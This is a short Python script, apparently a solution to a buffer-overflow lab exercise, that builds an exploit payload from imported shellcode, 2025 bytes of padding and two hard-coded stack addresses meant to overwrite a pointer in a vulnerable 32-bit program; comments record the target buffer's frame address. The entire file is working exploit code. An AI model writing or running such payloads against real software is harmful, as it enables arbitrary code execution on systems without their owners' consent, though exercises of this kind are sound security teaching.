from struct import pack
from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode + bytes.fromhex('41'*2025) + pack("<I", 0xfffea268) + pack("<I", 0xfffeaa7c))
#bytes.fromhex('41'*2025)
#ebp for buffer = 0xfffeaa78
#use prointer assignment
